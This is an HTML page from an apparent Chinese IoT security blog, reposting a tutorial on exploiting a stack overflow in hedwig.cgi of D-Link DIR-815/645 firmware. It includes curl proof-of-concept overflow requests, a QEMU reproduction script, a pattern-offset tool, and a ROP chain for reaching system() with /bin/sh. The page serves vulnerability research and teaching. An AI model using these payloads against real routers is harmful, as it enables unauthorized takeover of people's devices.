@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>路由器固件安全分析技术(二) | 物联网安全技术研究</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  
+  <meta name="description" content="文章转载自：漏洞盒子原文作者：lzl@TCC原文链接：https://www.vulbox.com/knowledge/detail/?id=42">
+<meta property="og:type" content="article">
+<meta property="og:title" content="路由器固件安全分析技术(二)">
+<meta property="og:url" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/index.html">
+<meta property="og:site_name" content="物联网安全技术研究">
+<meta property="og:description" content="文章转载自：漏洞盒子原文作者：lzl@TCC原文链接：https://www.vulbox.com/knowledge/detail/?id=42">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/14985524456992.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/14991609258091.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/14992257339133.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/14992258407750.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15005644893824.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15005633108196.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15005633147554.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/14993318232847.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/1499332864463.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/14992360628857.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15005456292920.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006128417750.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006129074175.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006133599281.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/14993804636878.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/150061504655.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006151152050.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006167591111.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006156047635.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006012892796.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006018399438.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006023787213.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006027826284.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006189588651.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006075862795.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006076981310.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006189987695.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006141269345.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/15006141799661.jpg">
+<meta property="og:updated_time" content="2017-09-27T07:03:35.417Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="路由器固件安全分析技术(二)">
+<meta name="twitter:description" content="文章转载自：漏洞盒子原文作者：lzl@TCC原文链接：https://www.vulbox.com/knowledge/detail/?id=42">
+<meta name="twitter:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-二/14985524456992.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="物联网安全技术研究" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/hiero.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+  
+    <link rel="stylesheet" href="/css/vdonate.css" >
+  
+
+</head>
+
+<script>
+var themeMenus = {};
+
+  themeMenus["/主页"] = "Home"; 
+
+  themeMenus["/书籍"] = "books"; 
+
+  themeMenus["/工具"] = "tools"; 
+
+  themeMenus["/关于我们"] = "About"; 
+
+</script>
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  <header id="allheader" class="site-header" role="banner">
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="物联网安全技术研究" rel="home"> 物联网安全技术研究 </a>
+            
+          </h1>
+
+          
+            <div class="site-description">一个专注于物联网安全技术研究与交流的小站</div>
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+            <div class="clearfix sf-menu">
+
+              <ul id="main-nav" class="nmenu sf-js-enabled">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/主页">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/书籍">books</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/工具">tools</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/关于我们">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+
+      </div>
+  </div>
+</header>
+
+
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-路由器固件安全分析技术-二" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      路由器固件安全分析技术(二)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/2017/09/27/路由器固件安全分析技术-二/" class="article-date">
+	  <time datetime="2017-09-27T06:00:59.000Z" itemprop="datePublished">September 27, 2017</time>
+	</a>
+
+      
+	<span id="busuanzi_container_page_pv">
+	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>文章转载自：漏洞盒子<br>原文作者：lzl@TCC<br>原文链接：<a href="https://www.vulbox.com/knowledge/detail/?id=42" target="_blank" rel="external">https://www.vulbox.com/knowledge/detail/?id=42</a><br><a id="more"></a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文为继路由器固件安全分析技术（一）一文的后续篇目，由于文一主要注重于基础环境及基础知识点的说明整理，本篇及后续文章将由浅入深地对常见路由器固件漏洞进行分析，本篇则基于路由器固件中出现的栈溢出漏洞进行分析。</p>
+<p>本篇重如linux下运行windows IDA pro中python脚本方法，mips指令知识等等内容均可以回到文一进行结合查看。下面就将开始实战这一个路由器二进制漏洞——经典的栈溢出漏洞。</p>
+<h1 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h1><p>搭建系统版本：Linux debian 3.16.0-4-686-pae 静态分析软件：IDA 6.6 Pro</p>
+<p>固件下载地址：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP" target="_blank" rel="external">ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP</a>或者<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP" target="_blank" rel="external">ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP</a>。</p>
+<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>漏洞描述如下：</p>
+<pre><code>Buffer overflow on “post_login.xml”
+Invoking the “post_login.xml” server-side script, attackers can specify a “hash” password value that is used to authenticate the user. This hash value is eventually processed by the “/usr/sbin/widget” local binary. However, the latter copies the user-controlled hash into a statically-allocated buffer, allowing attackers to overwrite adjacent memory locations.
+As a proof-of-concept, the following URL allows attackers to control the return value saved on the stack (the vulnerability is triggered when executing “/usr/sbin/widget”):
+curl [http:// ip&gt;/post_login.xml?hash=AAA…AAABBBB
+The value of the “hash” HTTP GET parameter consists in 292 occurrences of the ‘A’ character, followed by four occurrences of character ‘B’. In our lab setup, characters ‘B’ overwrite the saved program counter (%ra).
+Buffer overflow on “hedwig.cgi”
+Another buffer overflow affects the “hedwig.cgi” CGI script. Unauthenticated remote attackers can invoke this CGI with an overly-long cookie value that can overflow a program buffer and overwrite the saved program address.
+Proof-of-concept: curl -b uid=$(perl -e ‘print “A”x1400;’) -d ‘test’ [http:// ip&gt;/hedwig.cgi
+Buffer overflow on “authentication.cgi”
+The third buffer overflow vulnerability affects the “authentication.cgi” CGI script. This time the issue affects the HTTP POST paramter named “password”. Again, this vulnerability can be abused to achieve remote code execution. As for all the previous issues, no authentication is required.
+Proof-of-concept: curl -b uid=test -d $(perl -e ‘print “uid=test&amp;password=asd” . “A”x2024;’) [http:// ip&gt;/authentication.cgi 但其实DIR-815等也收到影响。本篇将主要讲述hedwig.cgi中的漏洞成因及利用方式
+</code></pre><h1 id="hedwig-cgi栈溢出漏洞分析"><a href="#hedwig-cgi栈溢出漏洞分析" class="headerlink" title="hedwig.cgi栈溢出漏洞分析"></a>hedwig.cgi栈溢出漏洞分析</h1><p>通过binwalk提取出文件系统，对应/htdocs/web/hedwig.cgi。</p>
+<pre><code>tophant@debian:~/IOT/vulner/stack overflow/dir-815/_DIR-815_FIRMWARE_1.01.ZIP.extracted/dir815_FW_101/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/squashfs-root/htdocs/web$ file hedwig.cgi hedwig.cgi: broken symbolic link to /htdocs/cgibin
+</code></pre><p>所以需要分析的是/htdocs/cgibin这个程序。在IDA Pro中string窗口搜索cookie字符串，仅看到HTTP_COOKIE一项。进一步查看交叉引用也同样存在一处，地址为0x407d04。对应函数sess_get_uid。初略审阅sess_get_uid函数发现不存在危险的函数如strcpy等。所以对sess_get_uid函数查找交叉引用。(其实从函数名称来看其也可能仅仅是用来根据cookie名称获取cookie的值的)。hedwigcgi_main+0x1c8处发现sprintf危险函数，很有可能是导致溢出的位置。<br><img src="/2017/09/27/路由器固件安全分析技术-二/14985524456992.jpg" alt=""></p>
+<p>先对sess_getuid函数进行逆向发现存在一系列sobj开头的函数。<br><img src="/2017/09/27/路由器固件安全分析技术-二/14991609258091.jpg" alt=""></p>
+<h2 id="sobj类函数逆向分析"><a href="#sobj类函数逆向分析" class="headerlink" title="sobj类函数逆向分析"></a>sobj类函数逆向分析</h2><p>该函数中主要用到了sobj_new,sobj_add_string,sobj_add_char,sobj_get_string等几个函数。根据sobj_new函数来看出申请了0x18字节的空间作为结构体空间，其偏移0x0,0x4处存放对应分配的首地址。继续分析sobj_add_string/sobj_add_char函数得知，其sobj_new返回的结构体中0x10存放当前使用的字节数即进行拷贝过的字节数，0xc处存放当前申请的总长度减去1字节(代表空字节)，0x14存放malloc/realloc返回的地址，每次会根据strlen添加内容的长度与总长度减去已用长度得到可用长度进行比较决定是否需要再次申请空间，而strcpy的目的起始地址为分配地址加上已用字节数得到。至此，已经了解sobj的基本运作原理，回到sess_get_uid函数进行审阅，概括其基本流程。</p>
+<h2 id="sess-get-uid函数逆向分析"><a href="#sess-get-uid函数逆向分析" class="headerlink" title="sess_get_uid函数逆向分析"></a>sess_get_uid函数逆向分析</h2><p>首先通过sobj_new申请2个sobj对象，分别将地址存储在s2及s6寄存器内，接着通过getenv函数得到”HTTP_COOKIE”的环境变量，接着是在s1寄存器为0（根据后续分析得知这可能是控制状态转换的数据，根据不同的值进入不同的处理阶段），s5寄存器为0x3b（分号的ascii码），s7设置为0x20（空格的ascii码）。s0寄存器得到s4寄存器(getenv的返回值)进行读取一个字节转入loc_407d40,判断是否为空格，如果是则读取下一个字节再进行判断，v0寄存器设置为0x3d(等于号的ascii码)，通过sobj_add_char依次读入到s2存放的sobj对象中（第一次sobj_add_char后设置s1为1代表s2存放的sobj的字符串空间已经被申请），此时再设置s1寄存器为1代表cookie名称读入完毕，进入状态2；再次向后读取单个字节判断不为s5寄存器（存放分号的ascii码），完成读入cookie名称=xxxx；中的xxxx内容，完成后状态进入3。通过sobj_strcmp函数判断s2寄存器存放的sobj的内容是否为uid，再通过sobj_get_string得到读入的字符串通过sobj_add_string添加内容到s6寄存器存放的sobj中去。</p>
+<p>根据如上分析得知应HTTP_COOKIE环境变量应该设置为uid=xxxx的形式。对hedwigcgi_main在get_sess_uid函数调用前得知环境变量REQUEST_METHOD需要设置为POST。<br><img src="/2017/09/27/路由器固件安全分析技术-二/14992257339133.jpg" alt=""><br><img src="/2017/09/27/路由器固件安全分析技术-二/14992258407750.jpg" alt=""></p>
+<p>同时可以根据sess_get_uid后的sprintf的一系列参数源头。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15005644893824.png" alt=""><br><img src="/2017/09/27/路由器固件安全分析技术-二/15005633108196.png" alt=""><br><img src="/2017/09/27/路由器固件安全分析技术-二/15005633147554.png" alt=""></p>
+<p>现在，可以归纳为sprintf(栈空间位置,”%s/%s/postxml”,“/runtime/session”,uid的内容),uid的内容是由用户控制的，却没有长度限制，而格式化字符串的栈空间有限，hedwigcgi_main同时同时是一个非叶子函数，那么思路就是覆盖栈空间内的saved ra即可。</p>
+<p>其实在这里已经可以精准定位saved ra的偏移，根据sprintf目的地址及格式化内容前段及saved ra栈位置可以轻易推算。即0x428-0x4-0x13(注释：strlen(“/runtime/session”)+strlen(“/“))=1043，这也和后文保持一致。</p>
+<p>后面调用的cgi_parse_request函数将会获取REQUEST_URI，CONTENT_LENGTH,CONTENT_TYPE等环境变量，故下面将会进行相应设置。 为了验证出现溢出的位置，现构造如下命令进行漏洞复现。</p>
+<pre><code>#!/bin/bash
+debug_port=1111
+test=$(python -c &quot;print &amp;apos;uid=1234&amp;password=&amp;apos;+&amp;apos;A&amp;apos;*0x600&quot;)
+echo $test
+len=$(echo -n $test|wc -c)
+cp $(which qemu-mipsel) ./
+sudo
+chroot . ./qemu-mipsel -E 
+CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E   HTTP_COOKIE=$test
+-E CONTENT_LENGTH=$len -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E   
+REQUEST_METHOD=&quot;POST&quot; -E REMOTE_ADDR=&quot;127.0.0.1&quot; -g $debug_port 
+/htdocs/web/hedwig.cgi
+rm -f qemu-mipsel
+</code></pre><p>调试上去，可以看到sprintf前后，hedwigcgi_main函数的栈中保存ra地址内容的覆盖。</p>
+<pre><code>`addiu \$sp, -0x4E8sw \$ra, 0x4E8+var_4(\$sp)`
+</code></pre><p>patternLocOffset.py代码如下（代码来自揭秘家用路由器0day漏洞挖掘技术一书），其和如Windows下调试器WinDBG/immunity debugger使用的mona插件的pattern_create/pattern_offset使用方式及原理保持一致。</p>
+<pre><code>#!/usr/bin/env python
+#####################################################################################
+##Create pattern strings &amp; location offset 
+##Tested against Ubuntu 12.04 &amp; Windows
+##Example:
+##C:\Users\Lenov\Desktop&gt; patterLocOffset.py -c -l 260 -f output.txt
+###[*] Create pattern string contains 260 characters ok!
+###[+] output to output.txt ok!
+##C:\Users\Lenov\Desktop&gt; patternLocOffset.py -s 0x41613141 -l 260
+###[*] Create pattern string contains 260 characters ok!
+###[*] Exact match at offset 3
+##Nimdakey #09-10-2013
+#####################################################################################
+
+import argparse
+import struct
+import binascii
+import string
+import time
+import sys
+import re
+
+a = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
+b = &quot;abcdefghijklmnopqrstuvwxyz&quot;
+c = &quot;0123456789&quot;
+
+def generate(count,output):
+    #
+    #pattern create
+    codeStr = &amp;apos;&amp;apos;
+    print &amp;apos;[*] Create pattern string contains %d characters&amp;apos;%count,
+    timeStart = time.time()
+    for i in range(0,count):
+        codeStr += a[i/(26*10)]+b[(i%(26*10))/10]+c[i%(26*10)%10]
+    print &amp;apos;ok!&amp;apos;
+    if output:
+        print &amp;apos;[+] output to %s&amp;apos;%output,
+        fw = open(output,&amp;apos;w&amp;apos;)
+        fw.write(codeStr)
+        fw.close() 
+        print &amp;apos;ok!&amp;apos;
+    else:
+        return codeStr
+    print &quot;[+] take time: %.4f s&quot;%(time.time()-timeStart)
+
+def patternMatch(searchCode, length=1024):
+    #
+    #pattern search
+    offset = 0
+    pattern = None
+
+    timeStart = time.time()
+    is0xHex = re.match(&amp;apos;^0x[0-9a-fA-F]{8}&amp;apos;,searchCode)
+    isHex = re.match(&amp;apos;^[0-9a-fA-F]{8}&amp;apos;,searchCode)
+
+    if is0xHex:
+        #0x41613141
+        pattern = binascii.a2b_hex(searchCode[2:])
+    elif isHex:
+        #41613141
+        pattern = binascii.a2b_hex(searchCode)
+    else:
+        print &amp;apos;[-] seach Pattern eg:0x41613141&amp;apos;
+        sys.exit(1)
+
+    source = generate(length,None)
+    offset = source.find(pattern)
+
+    if offset != -1:
+        print &quot;[*] Exact match at offset %d&quot;%offset
+    else:
+        print &quot;[*] No exact matches, looking for likely candidates...&quot;
+        reverse = list(pattern)
+        reverse.reverse()
+        pattern = &quot;&quot;.join(reverse)
+        offset = source.find(pattern)
+        if offset != -1:
+            print &quot;[+] Possible match at offset %d (adjusted another-endian)&quot;%offset
+    print &quot;[+] take time: %.4f s&quot;%(time.time()-timeStart)
+
+def main():
+    ##parse argument
+    parser = argparse.ArgumentParser()
+    parser.add_argument(&amp;apos;-s&amp;apos;, &amp;apos;--search&amp;apos;, help=&amp;apos;search for pattern&amp;apos;)
+    parser.add_argument(&amp;apos;-c&amp;apos;, &amp;apos;--create&amp;apos;, help=&amp;apos;create a pattern&amp;apos;,\
+                        action=&amp;apos;store_true&amp;apos;)
+    parser.add_argument(&amp;apos;-f&amp;apos;, &amp;apos;--file&amp;apos;, help=&amp;apos;output file name&amp;apos;,\
+                        default=&amp;apos;patternShell.txt&amp;apos;)
+    parser.add_argument(&amp;apos;-l&amp;apos;, &amp;apos;--length&amp;apos;,help=&amp;apos;length of pattern code&amp;apos;,\
+                        type=int,default=1024)
+    #parser.add_argument(&amp;apos;-v&amp;apos;, dest=&amp;apos;verbose&amp;apos;, action=&amp;apos;store_true&amp;apos;)
+    args = parser.parse_args()
+
+    ##save all argument
+    length = args.length
+    output = args.file
+    #verbose = args.verbose
+    createCode = args.create
+    searchCode = args.search
+
+    if createCode and (0 &lt; args.length &lt;= 26*26*10):
+        #eg:  -c -l 90
+        generate(length,output)
+    elif searchCode and (0 &lt; args.length &lt;= 26*26*10):
+        #eg: -s 0x474230141
+        patternMatch(searchCode,length)
+    else:
+        print &amp;apos;[-] You shoud chices from [-c -s]&amp;apos;
+        print &amp;apos;[-] Pattern length must be less than 6760&amp;apos;
+        print &amp;apos;more help: pattern.py -h&amp;apos;
+    #...
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre><p>使用patternLocOffset脚本生成满足条件长度的字符串并定位。</p>
+<pre><code>python patternLocOffset.py -c -l 1500 -f loc
+python patternLocOffset.py -s 0x42396942 -l 1500
+</code></pre><p><img src="/2017/09/27/路由器固件安全分析技术-二/14993318232847.jpg" alt=""></p>
+<p>得知只要1047个字节就可以覆盖到saved_ra栈位置处了，由于以该位置后方，故修改生成的内容为：</p>
+<pre><code>test=$(python -c “print ‘uid=’+’A’(1047-4)+’B’4+’A’*100”)。
+</code></pre><p>此时看到已经精确定位到saved_ra，控制该非叶子函数的流程了。<br><img src="/2017/09/27/路由器固件安全分析技术-二/1499332864463.jpg" alt=""></p>
+<p>运行到heiwigcgi_main还原$ra寄存器看到内容为0x42396942。<br><img src="/2017/09/27/路由器固件安全分析技术-二/14992360628857.jpg" alt=""></p>
+<p>使用如下命令编译并使用mipsel版本的gdb。首先进入<a href="http://ftp.gnu.org/gnu/gdb/下载gdb-8.0.tar.gz，解压后输入如下命令。（原文给出的链接已经失效，所以本文也不再显示链接地址）" target="_blank" rel="external">http://ftp.gnu.org/gnu/gdb/下载gdb-8.0.tar.gz，解压后输入如下命令。（原文给出的链接已经失效，所以本文也不再显示链接地址）</a></p>
+<pre><code>cd gdb-mips
+./configure --target=mipsel-linux--prefix=/usr/local/mipsel-gdb-8.0
+make
+sudo make install
+ln -s /usr/local/mipsel-gdb-8.0/bin/mipsel-linux-gdb /bin/mipsel-gdb
+</code></pre><p>现在便可以直接使用mips-gdb了，同样安装gdb插件。</p>
+<pre><code>git clone https://github.com/longld/peda.git ~/peda
+echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
+</code></pre><p>其中的checksec命令可以查看开启的安全机制。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15005456292920.jpg" alt=""></p>
+<p>观察到所有的安全机制均未开启，非常棒，可以接下来的漏洞利用代码可以不太受到限制。</p>
+<p>同时值得说明的是/var/tmp/temp.xml文件打开成功后同样会转入一处sprintf，而uid的cookie值会被带入，同样存在栈溢出漏洞，而binwalk进行提取的文件系统中var目录中为空。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006128417750.jpg" alt=""></p>
+<p>经过一系列流程控制成功后则会转入另一处溢出处。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006129074175.jpg" alt=""></p>
+<p>这里的\$a0及sprintf的参数1目的地址同为一处（addiu \$s0, \$sp, 0x4E8+var_428），而格式化内容不同，可以根据图中的字符串看出，而最后可控的部分\$s3由sobj_get_string从\$s5得到，前面分析过这个寄存器保存的就是sess_get_uid的返回结构体。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006133599281.jpg" alt=""></p>
+<p>以计算第一处sprintf距离saved ra的计算方式可以得知，这里偏移为1005个字节。这里被证明为可以溢出利用的地方。<br><img src="/2017/09/27/路由器固件安全分析技术-二/14993804636878.jpg" alt=""></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>为了确定lib.so.0的基地址，运行脚本后ps -ef查看pid，cat /proc/pid/maps查看模块基地址。<br><img src="/2017/09/27/路由器固件安全分析技术-二/150061504655.jpg" alt=""><br><img src="/2017/09/27/路由器固件安全分析技术-二/15006151152050.jpg" alt=""></p>
+<p>查看到libc.so.0的基地址为0x40801000/0x40854000(看是否存在执行x权限)。经过调试验证为0x40854000。</p>
+<p>因为在确定了system地址后，计算偏移+基地址的内容是否和system一致。这里可以看到0x40854000为基地址时，加上0x53200处为system函数。(但是这里是qemu环境下的情况和真实路由器情况不同)。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006167591111.jpg" alt=""></p>
+<p>ida打开lib/lib.so.0（为符号链接指向libuClibc-0.9.30.1.so），查看到system函数位于lib.so.0偏移0x53200位置处。同时由于期望执行shell那么必须需要向system函数的参数填入对应参数，即让\$a0参数指向”/bin/sh”。但是此时由于仅仅对hedwig_main内栈空间到高地址可访问空间的控制权，所以需要将布置好的可以溢出位置内填入/bin/sh后将其地址交给某个寄存器。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006156047635.jpg" alt=""></p>
+<p>首先在Search菜单栏中点击mips rop gadgets激活mips ROP的插件。在IDA pro的python命令行窗口输入mipsrop.stackfinders()。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006012892796.jpg" alt=""></p>
+<p>在真正实现利用之前，继续确认一个事实，覆盖的地址即栈的局部变量在当前函数空间保存的寄存器内容的相对低地址位置，所以在真正jr \$ra控制流程前，对如\$s0，\$s1,\$fp等等寄存器的内容均为可控。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006018399438.jpg" alt=""></p>
+<p>继续回到搜索的ROP链去看，如第一处0x0000B814地址的ROP,双击该地址后看到从\$sp到寄存器转移到跳转的过程。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006023787213.jpg" alt=""></p>
+<p>该gadget的第一步是通过addiu \$a1,\$sp,0x18(0x168-0x150=0x18)填入寄存器\$a1，之后通过攻击者可以控制的\$s1进行如system的跳转，但是不满足条件的是无法对填充的字符串作为参数交给system函数进行执行。</p>
+<p>继续以如上判断方式去看发现直到第6个ROP gadget可以满足条件。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006027826284.jpg" alt=""></p>
+<p>\$s5寄存器将指向\$sp+0x10的位置，下一个gadget的地址也可以通过攻击者可以控制的\$s0寄存器而来，最后能够满足函数调用时参数1就是从栈位置调整到寄存器的\$s5，故选取该处地址的gadget。</p>
+<p>计算出saved s0到saved ra的距离为0x24。故目前覆盖时的结构会是如下表格形式。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006189588651.jpg" alt=""></p>
+<p>会到前面查看system地址处为0x53200偏移处，那么填入saved so对应表格第二行处的内容存在截断字符\x00，使用文一类似的简化方法，通过填充saved s0为偏移0x531ff，再通过一个gadget将其将上1转换到偏移0x53200处。<br>同样的，在libc.so.0中的python窗口中输入mipsrop.find(“addiu \$s0,1”);。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006075862795.jpg" alt=""></p>
+<p>点击第一处地址进行查看并分析。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006076981310.jpg" alt=""></p>
+<p>首先这里的调整\$s0的addiu \$s0,1作为延迟槽指令被执行，t9即s5寄存器的地址就是希望下一步执行的地址，所以填充为之前找到的stackfinder的rop gadget。</p>
+<p>所以这里明确了溢出内容如何布置。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006189987695.jpg" alt=""></p>
+<p>从执行顺序来说，saved ra执行引发了saved s5的执行，最后将设置好的命令行参数填入其中转入saved s0-真正的system函数地址进行执行。</p>
+<p>查看msf的exp，地址为<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb</a>,其构造的rop及由于未开启的随机地址分布而使用的硬编码与分析一致（可看peda插件的checksec命令结果）。<br><img src="/2017/09/27/路由器固件安全分析技术-二/15006141269345.jpg" alt=""><br><img src="/2017/09/27/路由器固件安全分析技术-二/15006141799661.jpg" alt=""></p>
+<p>当能够通过system执行了telnet命令，那么便能够直接控制路由器了。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>揭秘家用路由器0day漏洞挖掘技术——吴少华<br>详细的路由器漏洞分析环境搭建教程——伐秦<br>Reported Vulnerability - D-Link routers authenticate administrative access using specific User-Agent string</p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+      
+        <div id="donation_div"></div>
+
+<script src="/js/vdonate.js"></script>
+<script>
+var a = new Donate({
+  title: '如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作!', // 可选参数，打赏标题
+  btnText: 'Donate', // 可选参数，打赏按钮文字
+  el: document.getElementById('donation_div'),
+  wechatImage: 'https://raw.githubusercontent.com/iTimeTraveler/iTimeTraveler.github.io/site/source/about/donate/images/WeChanQR.png',
+  alipayImage: 'https://raw.githubusercontent.com/iTimeTraveler/iTimeTraveler.github.io/site/source/about/donate/images/AliPayQR.jpg'
+});
+</script>
+      
+
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
